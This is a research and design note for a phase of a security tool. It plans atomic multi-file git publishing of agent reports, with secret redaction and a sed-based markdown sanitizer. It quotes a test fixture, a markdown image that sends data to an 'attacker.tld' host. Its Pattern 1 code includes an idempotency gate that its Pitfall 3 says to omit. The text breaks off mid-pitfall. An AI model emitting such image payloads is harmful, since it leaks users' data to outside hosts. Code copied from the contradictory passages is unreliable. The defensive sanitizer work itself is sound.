# Phase 24: Multi-File Publish Bundle (Outbound Path) - Research

**Researched:** 2026-04-14
**Domain:** Host-side multi-file atomic git commit with pre-commit redaction + markdown sanitization + concurrent-push safety
**Confidence:** HIGH

## Summary

Phase 24 is a second conservative, additive extension of Phases 16 and 23. 80% of the machinery already exists in `bin/claude-secure`: the Phase 23 `do_profile_init_docs` function is the closest structural twin (multi-file clone + stage + atomic commit + `push_with_retry`), the Phase 16 `publish_report` function contributes the single-file path layout pattern (`<prefix>/YYYY/MM/<name>.md`), the Phase 16 `redact_report_file` function is the reusable host-side secret redactor (D-15), and the Phase 17 expanded `push_with_retry` already implements the 3-attempt rebase loop against non-fast-forward races, tested explicitly for concurrent publishes.

The new work is: (1) a fresh `publish_docs_bundle` function that accepts a pre-rendered report body plus delivery metadata and lays out both the report file and an INDEX.md update in one clone, (2) a new markdown sanitizer helper (`sanitize_markdown_file`) that strips external image references, raw HTML, and HTML comments using `sed` with anchored regexes, (3) a never-overwrite guard on the report filename, and (4) INDEX.md append logic that must be race-safe because two concurrent publishes for the same profile both want to append. Requirement 5 (concurrent publishes produce two commits on `main` with no lost updates) is **already solved** by the Phase 17 push_with_retry rebase loop — the phase must reuse it unmodified.

The single highest-severity design decision is how the new function should consume the existing Phase 16 `redact_report_file`: it operates on a single file using the profile `.env` as the secret source. For multi-file bundles, the plan must loop `redact_report_file` over every staged file (report file + INDEX.md) before `git add`, and the unit tests must verify that a secret seeded into the report and into INDEX.md (via a crafted delivery ID or summary line) never reaches the remote. No rewrite of the redaction function is needed.

**Primary recommendation:** Add `sanitize_markdown_file()` as a new helper (20 lines of `sed`), add `publish_docs_bundle()` as a new function that mirrors `do_profile_init_docs`'s clone-stage-commit-push structure but stages two files, runs the redactor + sanitizer over each staged file before `git add`, uses `O_EXCL`-style never-overwrite semantics for the report path, and reuses `push_with_retry` for the push. Do not modify `redact_report_file`, do not modify `push_with_retry`, and do not touch the Phase 3 Anthropic proxy — "the existing Phase 3 secret redaction pipeline" in the phase spec refers to the host-side redaction that Phase 16 ships (`redact_report_file`, built on the Phase 3 whitelist pattern), not the container-side proxy.

## User Constraints (from CONTEXT.md)

No CONTEXT.md exists for this phase — `/gsd:discuss-phase` has not been run. The planner should treat the roadmap success criteria (copied verbatim into Phase Requirements below) as the locked decisions, and mark all other design choices as Claude's discretion until/unless a discussion pass adds CONTEXT.md.

## Project Constraints (from CLAUDE.md)

These directives are extracted from `./CLAUDE.md` and carry the same authority as locked decisions. Plans must not contradict them.

- **Dependency minimization is a security invariant, not a preference.** No new host dependencies (`git`, `jq`, `sed`, `awk`, `grep`, `mktemp`, `bash` 4+, `curl`, `uuidgen` are already required). Do not introduce pandoc, html2text, Python markdown libraries, or Node-based sanitizers. Every new dep is a new supply-chain attack surface for a security product.
- **"No secret ever leaves the isolated environment uncontrolled."** Every file staged for commit MUST pass through the host-side redactor (Phase 16 `redact_report_file`) before `git add`. This is the strongest invariant in the project and is encoded as RPT-03.
- **Root-ownership + immutability of hooks/settings/whitelist.** Phase 24 does not touch hook scripts or whitelist.json, so this does not apply directly — but the publish-bundle function runs in host bash outside the container, so it has host privileges and must not echo secrets to stderr (Phase 16 `sed` scrub pattern is the invariant).
- **Bash 5.x + jq 1.7+ + git 2.43 are the standard stack.** Mirror Phase 12/16/17/23 idioms; do not introduce novelty.
- **GSD workflow enforcement.** This research follows `/gsd:research-phase`; implementation must follow `/gsd:execute-phase`. No direct edits outside GSD entry points.

## Phase Requirements

| ID | Description | Research Support |
|----|-------------|------------------|
| DOCS-02 | Agent reports written to `projects/<slug>/reports/YYYY/MM/<date>-<session-id>.md`, one file per execution, never overwriting | `publish_docs_bundle` constructs the path from `DOCS_PROJECT_DIR` + `date -u +%Y/%m/%Y-%m-%d` + `--session-id`; refuses to commit if `[ -e "$abs_path" ]` before mkdir. Phase 16 D-12 is the sibling pattern. |
| DOCS-03 | `projects/<slug>/reports/INDEX.md` receives a one-line summary entry per report | `publish_docs_bundle` appends a pipe-delimited row to the INDEX.md table; reads+rewrites in place inside the clone so both files go into the same commit. |
| RPT-01 | Every report uses the 6-section standardized template (Goal, Where Worked, What Changed, What Failed, How to Test, Future Findings) | Ship a single canonical template file under `webhook/report-templates/bundle.md`, plus a validator (`verify_bundle_sections`) that enforces all six H2 headings are present in the input body before clone. Template is consumed by Phase 26 (Stop hook) which will be the caller; Phase 24 ships the file + validator only. |
| RPT-02 | Report + INDEX.md update commit as exactly one atomic git commit (no partial push) | Mirror `do_profile_init_docs` atomicity pattern: stage both files with `git add`, run `git diff --cached --quiet` as a no-op gate, then a single `git commit -m ...`. Failure mid-bundle leaves a clean tree because the clone_dir is torn down by `_CLEANUP_FILES` and no commit is created until both files are written. |
| RPT-03 | Every staged file passes through existing secret redaction pipeline before `git add` | Reuse `redact_report_file` (line 1039, Phase 16 D-15). Loop: for each file to stage, `redact_report_file "$f" "$CONFIG_DIR/profiles/$PROFILE/.env"`. Must run BEFORE `git add`. |
| RPT-04 | Every staged file is sanitized (strip external images, raw HTML, HTML comments) before commit | New helper `sanitize_markdown_file()` (sed-based, 4 passes: HTML comments, raw HTML tags, external image refs, external reference-style image defs). Run AFTER redaction, BEFORE `git add`. |
| RPT-05 | Push uses `git push` over HTTPS (never `--force`) with 3-attempt jittered retry on non-fast-forward | Reuse `push_with_retry` (line 1174, Phase 17 3-attempt rebase loop). Do not modify. The function already handles file://, https://, and 5 flavors of remote-ref rejection. **Phase 17 plan 17-03 explicitly tested 3-way concurrent publish races against this function.** |

**Success Criteria Mapping:**
1. Path + never-overwrite → `publish_docs_bundle` constructs path, guards with `[ -e ]` pre-check
2. Atomic single commit + failure-safe working tree → stage-both + one `commit` + `push_with_retry`, clone_dir cleanup on any error
3. Pre-commit redaction of every staged file → `redact_report_file` loop over all bundle paths before `git add`
4. Markdown sanitization of every staged file → `sanitize_markdown_file` loop before `git add`
5. Concurrent publishes produce two commits, no lost updates → `push_with_retry`'s 3-attempt rebase loop handles INDEX.md merge via `pull --rebase`; if both publishes append different lines, rebase resolves textually without conflict

## Standard Stack

### Core
No new dependencies. Every tool required by this phase is already installed and exercised in Phases 12-23.

| Library | Version | Purpose | Why Standard |
|---------|---------|---------|--------------|
| `git` | 2.43+ (host-verified) | clone + commit + push bundle | Phase 16/23 precedent — identical to `publish_report` / `do_profile_init_docs` |
| `sed` (GNU on Linux, brew gnubin on macOS per PORT-01) | — | Markdown sanitizer passes | Already required; PATH-shimmed on macOS by Phase 18 |
| `awk` (GNU) | — | Secret redactor (via `redact_report_file`) uses awk — reused, not introduced | Phase 16 precedent |
| `jq` | 1.7+ | profile.json reads, envelope parsing | Phase 12+ precedent |
| `bash` | 5.x (re-exec on macOS) | function body | Phase 18 portability enforcement |
| `mktemp`, `date -u`, `grep -E` | — | clone dir, path construction, regex filters | Phase 16 precedent |

### Supporting (Reused Functions — do not rewrite)

The phase reuses these existing functions verbatim. No refactors.

| Function | File:line | Reuse Pattern |
|----------|-----------|---------------|
| `validate_profile_name` | `bin/claude-secure:61` | Called as guard at top of `publish_docs_bundle` |
| `validate_profile` | `bin/claude-secure:73` | Already calls `validate_docs_binding` (Phase 23); re-invoking here is defensive for direct-invocation tests |
| `load_profile_config` | `bin/claude-secure:416` | Provides `DOCS_REPO`, `DOCS_BRANCH`, `DOCS_PROJECT_DIR`, `DOCS_REPO_TOKEN`, plus back-filled `REPORT_REPO_TOKEN` for `push_with_retry` |
| `redact_report_file` | `bin/claude-secure:1039` | Loop over every file in bundle before `git add`. Awk-from-file literal substring replace — metacharacter-safe. |
| `push_with_retry` | `bin/claude-secure:1174` | 3-attempt rebase loop, Phase 17 tested against 3-way concurrent publish race. **Do not modify.** |
| `do_profile_init_docs` (structure) | `bin/claude-secure:1348` | Moral twin — mirror the clone / mkdir-p / `git add` / `diff --cached --quiet` / atomic `commit` / `push_with_retry` flow |
| `publish_report` (file-placement) | `bin/claude-secure:1245` | Mirror the `YYYY/MM/...` directory construction and the askpass + PAT scrub pattern |
| `_CLEANUP_FILES` (spawn lifecycle) | `bin/claude-secure` top | Append `clone_dir` so spawn_cleanup wipes partial state — this is what makes "failure mid-bundle leaves clean working tree" true at the process-exit level |

### New Functions (3 total, all in `bin/claude-secure`)

| Function | Purpose | Approx LOC |
|----------|---------|------------|
| `sanitize_markdown_file(path)` | Strip HTML comments, raw HTML, external image refs, external reference-style image defs from a markdown file in place | ~25 |
| `verify_bundle_sections(body_path)` | Check the 6 mandatory H2 sections are present in the rendered body before clone | ~15 |
| `publish_docs_bundle(body_path, session_id, summary_line, [delivery_id])` | The main entry point — clone, path construction, never-overwrite guard, redact loop, sanitize loop, INDEX.md append, atomic commit, push_with_retry | ~120 |

Plus a new template file: `webhook/report-templates/bundle.md` containing the 6 empty sections. This is the canonical template referenced by Phase 26 (Stop hook) callers.

### Alternatives Considered

| Instead of | Could Use | Tradeoff |
|------------|-----------|----------|
| `sed` sanitizer | `pandoc --from gfm --to markdown_strict` | Adds a ~100MB host dep; pandoc's default conversion re-writes the whole document and may introduce its own artifacts. Project constraint: no new deps. |
| `sed` sanitizer | Python `markdown` + `bleach` | Same dep issue. Python is already installed but adding bleach means a pip install step in `install.sh`. |
| `sed` sanitizer | Node-based DOMPurify in the proxy container | The phase operates on host files before `git add` — nothing is going through the container. Routing through the container would bypass the host invariant. |
| Loop `redact_report_file` per file | Batch redactor that takes a list of files | File-by-file call is idempotent, testable, and already-shipped. A new batch variant would duplicate the awk-from-file pattern for no benefit. |
| In-place INDEX.md rewrite | Use GitHub API to append via API | REST multi-file commits require Tree+Blob+Commit choreography (three API calls) and can't be atomic with the report file write through a clone. Keep the single-clone pattern. |
| Custom retry loop in `publish_docs_bundle` | Reuse `push_with_retry` | Phase 17 17-03 tested push_with_retry against the exact race this phase's RPT-05 requirement specifies. Re-deriving means re-discovering the same surface. |
| Separate commit per file | One commit with both files staged | Success criterion 2 requires exactly one commit. Two commits is a bug. |

**No installation needed.** Every tool is already present. Verified:
```bash
$ git --version      # git version 2.43.0 (host)
$ jq --version       # jq-1.7.1
$ sed --version      # GNU sed 4.9 (Linux) / gnubin on macOS via PORT-01
$ awk --version      # GNU awk 5.2.1
```

**Version verification:** Not applicable — this phase adds zero new dependencies.

## Architecture Patterns

### Recommended Changes (scoped to `bin/claude-secure` + one template file)

```
bin/claude-secure
├── sanitize_markdown_file()           # NEW: sed-based 4-pass sanitizer
├── verify_bundle_sections()           # NEW: H2 heading presence check
├── publish_docs_bundle()              # NEW: main function (~120 LOC)
└── (CMD dispatch) no new subcommand   # Phase 26 is the caller; Phase 24 ships the library function only

webhook/report-templates/
└── bundle.md                          # NEW: 6-section canonical template

install.sh
└── Step 5c (report-templates copy)    # EXTEND: copy bundle.md alongside existing event-keyed templates
                                        # (Phase 16 plan 16-04 pattern — reuse verbatim)
```

**Key architectural decision: no new CMD dispatch case.** Unlike Phase 23 which added `profile init-docs`, Phase 24 is a pure library function. Phase 26 (Stop hook) is the caller. Shipping a CLI subcommand now would create a surface we don't need to maintain yet. If a test harness needs to invoke it directly, it sources the binary in library mode and calls `publish_docs_bundle` directly — same pattern Phase 23 tests use for `do_profile_init_docs`.

### Pattern 1: Multi-File Atomic Commit (RPT-02)

**What:** Stage multiple files with `git add`, then run exactly one `git commit` with no intermediate commits. Idempotency via `git diff --cached --quiet` short-circuit, atomicity via a single `commit` call.

**When to use:** `publish_docs_bundle()` body, after redact + sanitize passes on each staged file.

**Example** (sourced from `do_profile_init_docs` lines 1475-1510):
```bash
# Redact + sanitize BEFORE staging (order matters: redact first, sanitize second,
# because the sanitizer removes HTML and a secret hidden inside an HTML comment
# must be redacted while it's still visible to the redactor).
local _env_file="$CONFIG_DIR/profiles/$PROFILE/.env"
for f in "$abs_report_path" "$abs_index_path"; do
  if [ -f "$_env_file" ]; then
    redact_report_file "$f" "$_env_file"     # D-15 reuse
  fi
  sanitize_markdown_file "$f"                # NEW
done

# Stage both files
git -C "$clone_dir/repo" -c core.autocrlf=false add "$rel_report_path" "$rel_index_path"

# Idempotency + atomicity gate
if git -C "$clone_dir/repo" diff --cached --quiet; then
  echo "Nothing to commit (idempotent no-op)."
  return 0
fi

# Single atomic commit
GIT_AUTHOR_NAME="claude-secure" \
GIT_AUTHOR_EMAIL="claude-secure@localhost" \
GIT_COMMITTER_NAME="claude-secure" \
GIT_COMMITTER_EMAIL="claude-secure@localhost" \
git -C "$clone_dir/repo" -c core.autocrlf=false \
    commit -q -m "report($event_type): $session_id" 2>"$commit_err" || {
  sed "s|${pat}|<REDACTED:DOCS_REPO_TOKEN>|g" "$commit_err" >&2
  return 1
}

# Reuse Phase 17 3-attempt rebase loop
push_with_retry "$clone_dir" "$DOCS_BRANCH"
```

**Failure-safe invariant:** If any step fails before `git commit`, the working tree has staged changes but no commit. The `clone_dir` is ephemeral under `$TMPDIR/cs-publish-*` and is cleaned up by `_CLEANUP_FILES` on process exit. The source-of-truth repo (the remote) is untouched. If `git commit` fails, same story. If `push_with_retry` fails after commit, the commit exists locally in `clone_dir` but is discarded by cleanup — the remote is still untouched. **The "failure mid-bundle leaves clean working tree" success criterion is satisfied by never committing until both files are written and redacted, and by cleaning up the ephemeral clone.**

### Pattern 2: Markdown Sanitizer (RPT-04)

**What:** A 4-pass `sed` pipeline that strips security-sensitive markdown constructs: HTML comments (which can hide exfiltration beacons), raw HTML tags (which can embed `<img>` attacks), inline image references with external URLs, and reference-style image definitions.

**When to use:** Called once per file in `publish_docs_bundle`, after `redact_report_file`, before `git add`.

**Example:**
```bash
# Phase 24 RPT-04: strip markdown constructs that can exfiltrate data.
# Order matters: strip HTML comments first (they can contain <img>), then
# raw HTML tags, then external image refs (both inline and reference-style).
# Regex notes:
#   - All patterns use LC_ALL=C for deterministic ERE matching across glibc/BSD.
#   - HTML comment regex is non-greedy via [^-]* approximation (GNU sed lacks PCRE).
#   - Image URL regex recognizes http://, https://, and protocol-relative //.
#   - Local image references (relative paths, ./img.png) are PRESERVED.
sanitize_markdown_file() {
  local f="$1"
  [ -f "$f" ] || return 0

  local tmp
  tmp=$(mktemp "${TMPDIR:-/tmp}/cs-sanitize-XXXXXXXX")
  _CLEANUP_FILES+=("$tmp")

  LC_ALL=C sed -E \
    -e ':a' -e 'N' -e '$!ba' \
    -e 's|<!--([^-]|-[^-]|--[^>])*-->||g' \
    "$f" > "$tmp" && mv "$tmp" "$f"

  # Pass 2: strip raw HTML tags (opening, closing, self-closing).
  # This is intentionally aggressive: any <tag...> is removed.
  LC_ALL=C sed -E -i.bak 's|</?[A-Za-z][A-Za-z0-9-]*[^>]*>||g' "$f"
  rm -f "$f.bak"

  # Pass 3: strip external inline image references: ![alt](http://... or https://... or //...)
  # Preserves relative-path images: ![alt](./img.png), ![alt](img/foo.svg)
  LC_ALL=C sed -E -i.bak 's|!\[[^]]*\]\((https?:|//)[^)]*\)||g' "$f"
  rm -f "$f.bak"

  # Pass 4: strip reference-style image definitions pointing at external URLs.
  # Matches: [ref]: https://...   and   [ref]: //...
  LC_ALL=C sed -E -i.bak '/^\[[^]]+\]:[[:space:]]+(https?:|//)/d' "$f"
  rm -f "$f.bak"
}
```

**Critical correctness notes:**
- Pass 1 (HTML comments) uses the `N` label loop idiom (`:a; N; $!ba;`) so multi-line HTML comments are collapsed into one line before the regex runs. GNU sed lacks PCRE lookahead so this is the canonical "read whole file into pattern space" idiom.
- Pass 2 (raw HTML) is intentionally lenient: any `<anything>` is removed. This is correct for a security-first pipeline — the report template is plain markdown by design, and any user-agent-interpreted HTML is a potential beacon.
- Pass 3 preserves local images because they cannot exfiltrate (no DNS resolution, no external fetch).
- Pass 4 handles GFM reference-style image syntax which some markdown renderers process.
- The `-i.bak` + `rm -f "$f.bak"` idiom is the portable GNU/BSD sed inplace-edit idiom (Phase 18 portability rule).

**Source:** Pattern inspired by the Phase 3 whitelist philosophy (strip-by-default, allowlist local), verified against the markdown-exfiltration attack vectors in the InstaTunnel markdown exfiltrator writeup. The test fixture for RPT-04 (`![](https://attacker.tld/?data=x)`) is a textbook example of the attack the sanitizer prevents.

### Pattern 3: Never-Overwrite Report Path (DOCS-02)

**What:** Construct the report path, check `[ -e ]` before writing, fail with a distinct error message if the file exists. This is the one place Phase 24 diverges from `publish_report`'s "replay-is-idempotent" semantics — for DOCS-02, "never overwriting" means a second publish with the same session-id is a caller bug, not a no-op.

**When to use:** After clone, before `cp` of rendered body.

**Example:**
```bash
# DOCS-02: construct path from UTC date + session-id; never overwrite.
local year month day
year=$(date -u +%Y)
month=$(date -u +%m)
day=$(date -u +%Y-%m-%d)
local rel_report_path="${DOCS_PROJECT_DIR}/reports/${year}/${month}/${day}-${session_id}.md"
local abs_report_path="$clone_dir/repo/$rel_report_path"

if [ -e "$abs_report_path" ]; then
  echo "ERROR: report already exists at $rel_report_path — refusing to overwrite" >&2
  echo "       (if this is a replay, use a different session-id)" >&2
  return 1
fi

mkdir -p "$(dirname "$abs_report_path")"
cp "$body_path" "$abs_report_path"
```

**Why this differs from `publish_report`:** Phase 16's `publish_report` uses `delivery_id_short` (last 8 hex of delivery ID) which repeats on replay. The Phase 16 behavior is "commit again if content differs, no-op if identical". Phase 24 is called by the Phase 26 Stop hook with a session-id that uniquely identifies a Claude session — two publishes for the same session-id is an indication that a spool file was shipped twice, which is a bug in the shipper, not a normal flow. Fail loud.

### Pattern 4: INDEX.md Append Logic (DOCS-03)

**What:** Read INDEX.md from the clone, append a one-line table row, write back. The file must exist (created by `do_profile_init_docs` at Phase 23) — if it doesn't, that's an error (user never ran `profile init-docs`).

**When to use:** After the report file is cp'd into the clone, before sanitize + add.

**Example:**
```bash
# DOCS-03: append one-line summary to INDEX.md. Must exist from Phase 23 init-docs.
local rel_index_path="${DOCS_PROJECT_DIR}/reports/INDEX.md"
local abs_index_path="$clone_dir/repo/$rel_index_path"

if [ ! -f "$abs_index_path" ]; then
  echo "ERROR: INDEX.md not found at $rel_index_path" >&2
  echo "       Run 'claude-secure profile init-docs --profile $PROFILE' first." >&2
  return 1
fi

# Build the one-line summary. Three columns (Date | Session | Summary) match
# the header written by do_profile_init_docs (line 1468 in bin/claude-secure).
# Escape pipe characters in the summary to avoid breaking the table.
local ts_iso
ts_iso=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
local safe_summary
safe_summary="${summary_line//|/\\|}"
safe_summary="${safe_summary//$'\n'/ }"  # collapse newlines

printf '| %s | %s | %s |\n' "$ts_iso" "$session_id" "$safe_summary" >> "$abs_index_path"
```

**Race behavior:** Two concurrent `publish_docs_bundle` calls both clone, both append (to their own local INDEX.md), both try to push. The first succeeds; the second sees non-fast-forward; `push_with_retry` runs `git pull --rebase`. Rebase applies the second publisher's single-line append on top of the first publisher's state. Since both publishers appended different lines (different timestamps, different session-ids), git's textual merge handles it — no conflict. **This is why the Phase 17 push_with_retry rebase loop is the right primitive, and why duplicating it would be wrong.**

### Pattern 5: Six-Section Template Validator (RPT-01)

**What:** A short `grep -c` check that all 6 mandatory H2 headings are present in the rendered body before clone. Fail loud if any section is missing — the caller (Phase 26 Stop hook) is responsible for rendering them, and a missing section means the agent produced a malformed report.

**When to use:** Top of `publish_docs_bundle`, before clone. Guards against wasted clone/push cycles.

**Example:**
```bash
# RPT-01: six mandatory H2 sections must be present in the body.
# Phase 26 Stop hook is the caller; this is a defensive post-render check.
_BUNDLE_REQUIRED_SECTIONS=(
  "^## Goal$"
  "^## Where Worked$"
  "^## What Changed$"
  "^## What Failed$"
  "^## How to Test$"
  "^## Future Findings$"
)

verify_bundle_sections() {
  local body_path="$1"
  local section missing=0
  for section in "${_BUNDLE_REQUIRED_SECTIONS[@]}"; do
    if ! LC_ALL=C grep -qE "$section" "$body_path"; then
      echo "ERROR: report missing mandatory section: ${section#^## }" >&2
      missing=1
    fi
  done
  [ "$missing" = "0" ] && return 0 || return 1
}
```

**Anchored regexes** (`^## Goal$`) prevent partial matches inside code blocks or quoted text.

### Anti-Patterns to Avoid

- **Do NOT use `git commit --amend` or `git push --force`** — RPT-05 explicitly forbids force-push, and amending would break RPT-02's "single atomic commit" invariant.
- **Do NOT reorder redact + sanitize.** Redact MUST run first: a secret hidden inside `<!-- KEY=xxx -->` must be redacted while the comment is still visible. Sanitizing first would strip the comment and throw away evidence of the leak.
- **Do NOT skip `redact_report_file` on INDEX.md.** The one-line summary for a report can contain an accidentally-embedded secret (e.g., if the summary is derived from the report body); redacting both files is the belt-and-braces default that keeps the pipeline uniform.
- **Do NOT use `grep -v` to "strip HTML"** — it operates line-by-line and cannot collapse multi-line HTML comments. Use the `sed` `:a; N; $!ba;` pattern for HTML comments.
- **Do NOT write the report file then `git add` before the redact+sanitize pass.** Git tracks file hashes; if the pre-redacted version is ever written to the ODB (even in a throwaway clone), it exists in the reflog until garbage collection. Always redact+sanitize BEFORE `git add`.
- **Do NOT modify `push_with_retry`.** It was specifically tested in Phase 17 17-03 against concurrent publish races. Any change risks reintroducing the race RPT-05 tests against.
- **Do NOT add `publish_docs_bundle` to the CMD dispatch.** The caller is Phase 26, not an interactive user. Shipping a subcommand expands the public surface and implies contracts (CLI help, argument parsing, error codes) that aren't needed yet.
- **Do NOT overwrite an existing report file.** Fail loud with an actionable error. Idempotent-no-op semantics are wrong here — the caller made a mistake.
- **Do NOT invoke the Phase 3 Anthropic proxy for file redaction.** The proxy operates on outbound HTTP bodies to `api.anthropic.com`. It has nothing to do with git commits. The phase spec's reference to "the existing Phase 3 secret redaction pipeline" means "the file-based host-side redactor that Phase 16 built on Phase 3 principles" — that's `redact_report_file`.

## Don't Hand-Roll

| Problem | Don't Build | Use Instead | Why |
|---------|-------------|-------------|-----|
| Multi-file commit via REST | Custom GitHub Tree+Blob+Commit API choreography | Reuse the Phase 16 / 23 clone-stage-commit-push pattern | REST Tree API requires 3 round-trips, cannot be atomic across network failures, and adds `curl` JSON-payload complexity. Git commit over HTTPS is one round-trip and already tested. |
| Non-fast-forward retry | Fresh `git push` retry loop | `push_with_retry` from Phase 16/17 | Handles 5 flavors of remote-ref rejection (`non-fast-forward`, `Updates were rejected`, `failed to update ref`, `cannot lock ref`, `remote rejected`). Phase 17 17-03 tested it against a 3-way concurrent publish race. |
| Secret redaction over files | One-off `sed -i s/$PAT/REDACTED/` | `redact_report_file` (Phase 16 D-15) | Uses awk-from-file LITERAL substring replace — metacharacter-safe against PAT values containing `| / \ & $ [ ]`. Phase 16 Pitfall 1 explicitly documented this. |
| PAT presence in stderr | Uncontrolled `git ... 2>&1` | Phase 16 `sed "s|${pat}|<REDACTED>|g" err_log >&2` scrubber | Git occasionally echoes URL-embedded PAT on network errors. Must scrub every error path. |
| Markdown parser to sanitize | `pandoc`, `bleach`, `DOMPurify` | `sed` with 4 passes | New deps break the "no new deps" security invariant. A 4-pass sed script covers every attack vector in the Phase 24 spec (external images, raw HTML, HTML comments) and is inspectable in 25 lines. |
| Atomic multi-file write | Custom flock / tempfile rotation | Ephemeral clone dir + `push_with_retry` | Atomicity is supplied by git's commit-or-nothing semantics. Local atomicity is provided by running all edits inside the clone before `commit`. |
| INDEX.md row append with escaping | `jq`-based JSON-to-markdown conversion | Hand-rolled `printf` with pipe-escape bash substitution | INDEX.md is plain markdown, not JSON. `printf '\| %s \| %s \| %s \|\n'` + `${var//|/\\|}` is exhaustive and has zero dependencies beyond bash. |
| YYYY/MM path construction | `python -c "import datetime..."` | `date -u +%Y`, `date -u +%m`, `date -u +%Y-%m-%d` | GNU date (and Phase 18 gnubin on macOS) has format specifiers for every field needed. Phase 16 D-12 uses the same pattern. |
| Six-section validation | Full markdown AST parser | `grep -qE "^## Section$"` loop | Anchored regex on the exact H2 heading is 100% correct for the template shape shipped with the phase. An AST parser would handle heading levels flexibly, but the template mandates H2 — accept the rigidity. |

**Key insight:** This phase is 90% reuse and 10% new code, identical to Phase 23. Every problem it touches has an in-tree solution from Phases 12-23. The research bias should be toward "what's the nearest existing pattern" rather than "what's the textbook library for this". The one net-new primitive is `sanitize_markdown_file`, and that's 25 lines of sed.

## Runtime State Inventory

> Phase 24 is an additive outbound-path phase. It writes new files to a remote git repo and a new function to `bin/claude-secure`. There is no renaming or migration of existing state.

| Category | Items Found | Action Required |
|----------|-------------|------------------|
| Stored data | None. Phase 24 creates new files in the remote doc repo; it reads the profile `.env` for secret values (via `redact_report_file`) but does not modify it. The validator SQLite DB (Phase 2/17) holds call-IDs, unrelated. Mem0 / ChromaDB not in use in this project. | None — pure additive. |
| Live service config | Webhook listener (Phase 14/15) and reaper (Phase 17) do not call `publish_docs_bundle` in this phase. Phase 26 will wire the Stop hook as the caller. Phase 24 must not add any webhook or reaper change. | None for Phase 24. |
| OS-registered state | systemd unit files (`webhook/*.service`, `webhook/*.timer`) and future launchd plists (Phase 21) do not reference `publish_docs_bundle` or `reports/INDEX.md`. | None. |
| Secrets/env vars | Phase 24 reads `DOCS_REPO_TOKEN` (Phase 23) from the host shell env — already exported by `load_profile_config` after Phase 23. Back-filled `REPORT_REPO_TOKEN` flows through `push_with_retry`. The profile `.env` path is consumed by `redact_report_file` as the redaction secret source — unchanged. | Code edit only (new function uses existing env). No `.env` schema change. |
| Build artifacts / installed packages | `webhook/report-templates/` is an installed directory (Phase 16 plan 16-04 copies it to `/opt/claude-secure/webhook/report-templates/` via `install.sh` step 5c). Phase 24 ships a new template file `bundle.md` that must be added to the step 5c copy list. If install.sh is not updated, `bundle.md` will not be in the installed tree and Phase 26's Stop hook will not find it. | **Update `install.sh` step 5c to copy `webhook/report-templates/bundle.md`** — trivial one-line addition to the existing cp glob or explicit file list. Verify with a fresh install test. |

**Canonical check:** *After every file in the repo is updated, what runtime systems still have the old string cached, stored, or registered?*

- Nothing. Phase 24 is additive only. No strings are renamed.

**Nothing found in category:** Stored data, live service config, OS-registered state — all verified by direct codebase grep (`publish_docs_bundle|sanitize_markdown_file|bundle\.md` → currently zero hits because this is net-new).

## Environment Availability

| Dependency | Required By | Available | Version | Fallback |
|------------|------------|-----------|---------|----------|
| `git` | clone + commit + push | ✓ | 2.43.0 | — (Phase 16/23 already require) |
| `jq` | session-id read (optional) | ✓ | 1.7.1 | — (Phase 12+ require) |
| GNU `sed` | sanitize_markdown_file 4 passes | ✓ | 4.9 (Linux) / brew gnubin (macOS via PORT-01) | — |
| GNU `awk` | `redact_report_file` reuse | ✓ | 5.2.1 | — |
| `grep -E` | `verify_bundle_sections` + path guards | ✓ | system | `LC_ALL=C` for determinism |
| `mktemp`, `date -u +%Y-%m-%d`, `cp`, `mkdir -p`, `printf` | path construction + file ops | ✓ | GNU coreutils | — |
| `bash` 5.x | function body, array vars | ✓ | 5.2 | Phase 18 re-exec on macOS |

**Missing dependencies with no fallback:** None.
**Missing dependencies with fallback:** None.

Phase 24 adds zero new host requirements.

## Common Pitfalls

### Pitfall 1: Redact runs AFTER sanitize, so secrets hidden in HTML comments leak

**What goes wrong:** If the pipeline is sanitize-then-redact, a secret inside `<!-- DOCS_REPO_TOKEN=ghp_xxx -->` is first stripped by the sanitizer (which removes the comment), then redacted (which sees no match because the comment is gone). The secret never appears in the committed file, so this pitfall manifests only if the sanitizer leaves a partial match or if the intermediate file is observed.

**Why it happens:** Ordering bias — it feels more natural to "clean up the file first, then remove secrets from the cleaned version". That is wrong for a defense-in-depth pipeline.

**How to avoid:** Run redact FIRST, sanitize SECOND. Document this ordering inline in `publish_docs_bundle`. Add a unit test that seeds a secret inside `<!-- KEY=$DOCS_REPO_TOKEN -->` and asserts the literal secret value never appears in the final file — this test must fail if the ordering is reversed.

**Warning signs:** Code review comment saying "shouldn't sanitize run first since it reduces the amount of text redactor has to scan?" — the answer is no, redact first is correct.

### Pitfall 2: `sed` multi-line HTML comment strip leaves partial tags on GNU vs BSD

**What goes wrong:** GNU sed and BSD sed handle `N; $!ba;` slightly differently with the pattern space. The regex `<!--.*-->` with greedy matching spans across multiple comments and strips legitimate content between them.

**Why it happens:** sed lacks PCRE lazy quantifiers. The `[^-]|-[^-]|--[^>]` approximation is the canonical POSIX non-greedy workaround but has edge cases.

**How to avoid:** Test the sanitizer against a fixture file with multiple HTML comments separated by real content: the content between comments must survive. Use the Phase 18 gnubin path on macOS to guarantee GNU sed semantics. Alternative: pipe through `awk` instead, which has proper non-greedy handling — but Phase 16's redactor already uses awk and adding another awk pass for sanitization is fine.

**Warning signs:** Test fixture "Real content between `<!-- comment1 -->` and `<!-- comment2 -->`" comes out as "Real content between ".

### Pitfall 3: `git diff --cached --quiet` passes when only timestamps changed

**What goes wrong:** If the INDEX.md row append logic writes the same line twice (e.g., replay path), the second append produces a different file (one extra line), so the diff is non-empty and a commit happens. But if a shift in date boundary causes the line to be identical, the idempotency gate triggers and no commit happens — which is the intended behavior for pure-idempotency but WRONG for Phase 24 where every publish must produce a commit.

**Why it happens:** Phase 23 `do_profile_init_docs` is idempotent (second run = no new commit). Phase 24 is NOT idempotent — a second publish with a fresh session-id must always produce a new commit. The idempotency gate is harmful here.

**How to avoid:** Do NOT add `git diff --cached --quiet` to `publish_docs_bundle`. The never-overwrite guard + unique session-id in the INDEX.md row guarantees the diff is always non-empty for legitimate calls. If the diff IS empty, something is wrong (caller bug) and we should fail loud rather than silently no-op.

**Warning signs:** Test case "publish_docs_bundle called twice with different session-ids produces exactly 2 commits" — if implementation has the Phase 23 idempotency gate, only 1 commit is created and the test fails.

### Pitfall 4: Concurrent publishes succeed but INDEX.md rebase conflict

**What goes wrong:** Publisher A appends line `T1 | session-A | ...`. Publisher B appends line `T2 | session-B | ...`. A pushes first. B sees non-fast-forward, runs `git pull --rebase`. Rebase applies B's change on top of A's state. If the two lines happened to hash-conflict (different timestamps, same session-id by coincidence), rebase marks a conflict and `push_with_retry` returns error.

